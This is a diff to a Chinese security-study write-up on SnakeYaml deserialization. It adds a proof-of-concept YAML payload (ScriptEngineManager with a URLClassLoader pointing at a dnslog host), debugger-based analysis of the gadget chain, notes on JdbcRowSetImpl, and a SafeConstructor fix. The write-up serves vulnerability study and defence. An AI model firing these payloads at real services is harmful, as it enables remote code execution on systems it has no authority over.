@@ -344,8 +344,78 @@ public class SPIMain() {
 ## 漏洞原理
 由于`SnakeYaml`是用来支持反序列化`Java`对象的, 因此当`Yaml.load`函数的参数外部参数可控时, 攻击者即可传入一个恶意类的`yaml`格式序列化内容, 利用服务端对`yaml`数据进行反序列化操作来达到`SnakeYaml`反序列化漏洞的利用.
 
-## 漏洞复现
+## Gadgets
+### ScriptEngineManager
+#### 漏洞演示
+先复现一下该漏洞, `POC`如下:
+
+```java
+package org.h3rmesk1t.SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/1 6:35 下午
+ */
+public class ScriptEngineManagerExploit {
+
+    public static void main(String[] args) {
+
+        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://hfme12.dnslog.cn\"]]]]\n";
+        Yaml yaml = new Yaml();
+        yaml.load(poc);
+    }
+}
+```
+
+可以看到下图中成功获取`dnslog`请求, 但是只是探测是否进行了反序列化, 如果需要利用的话还需要构造命令执行的代码.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/8.png"></div>
+
+对于上文的命令执行的脚本, 可以参考[yaml-payload.jar](https://github.com/artsploit/yaml-payload/), 其实现了`ScriptEngineFactory`接口, 然后在静态代码块处填写需要执行的命令, 将项目打包后挂载到`web`端, 使用`payload`进行反序列化后请求到该位置, 实现`java.net.URLClassLoader`调用远程的类进行执行命令即可.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/9.png"></div>
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/10.png"></div>
+
+#### 漏洞分析
+在`yaml.load`处下断点, 跟进到`this.constructor.getSingleData`, 调用`this.constructDocument`.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/11.png"></div>
+
+跟进`this.constructDocument`, 其调用`this.constructObject`来获取一个`Object`对象, 跟进该方法, 进一步调用`this.constructObjectNoCheck`.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/12.png"></div>
+
+跟进`constructObjectNoCheck`方法. 
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/13.png"></div>
+
+接着跟进`construct.construct`方法, 这里会调用`this.getConstructor`, 跟进去发现继续调用`getClassForNode`, 在该方法中获取了`name`的值为`javax.script.ScriptEngineManager`, 然后调用`getClassForName`对`name`进行传入获取`cl`的`class`对象.
+
+跟进`getClassForName`, 在这里使用反射创建了一个`javax.script.ScriptEngineManager`对象的具体实现.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/14.png"></div>
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/15.png"></div>
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/16.png"></div>
+
+接着回到上面, 继续跟进`construct`, 将关注点聚集在`else`语句中, 这段代码创建了一个`array`数组, 并且调用`node.getType.getDeclaredConstructors();`赋值给`arr$`数组, 在上文的分析中, 获取的`name`, 也就是利用了`javax.script.ScriptEngineManager`, `Class.forName`进行创建反射对象并且赋值给`note`的`type`里面, 接着调用`getDeclaredConstructors`获取它的无参构造方法.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/17.png"></div>
+
+然后将获取到的`arr`数组添加到`possibleConstructors`, 而后将获取到的`possibleConstructors`获取到的第一个数组进行赋值并转换成`Constructor`类型.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/18.png"></div>
+
+接着回去遍历获取`snode`的值, 使用反射实例化对象, 最终使用`public javax.script.ScriptEngineManager(java.lang.ClassLoader)`构造器实例化`javax.script.ScriptEngineManager`, 接着就是上文提到的`SPI`机制的分析过程了.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/19.png"></div>
+
 ### JdbcRowSetImpl
+#### 漏洞演示
 利用一下`Fastjson`中经典的`JdbcRowSetImpl`, 成功打通.
 
 ```java
@@ -370,4 +440,28 @@ public class JdbcRowSetImplExploit {
 
 <div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/7.png"></div>
 
-### ScriptEngineManager
+#### 漏洞分析
+简而言之, `SnakeYaml`在调用`Yaml.load`反序列化的时候, 会调用到`JdbcRowSetImpl`类的`dataSourceName`属性的`setter`方法即`setDataSourceName`, 然后就触发后续一系列的利用链最后达到任意代码执行的目的.
+
+### Others Gadgets
+先鸽着, 等后面了解了相关知识点再来补, [参考文章](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#:~:text=Spring%20PropertyPathFactoryBean).
+
+## 漏洞修复
+ - 禁止`Yaml.load`参数可控.
+ - 若需要反序列化, 则要过滤参数内容, 使用`SafeConstructor`对反序列化内容进行白名单控制.
+
+```java
+package org.h3rmesk1t.SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+public class ScriptEngineManagerExploit {
+
+    public static void main(String[] args) {
+
+        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://hfme12.dnslog.cn\"]]]]\n";
+        Yaml yaml = new Yaml(new SafeConstructor());
+        yaml.load(poc);
+    }
+}
+```
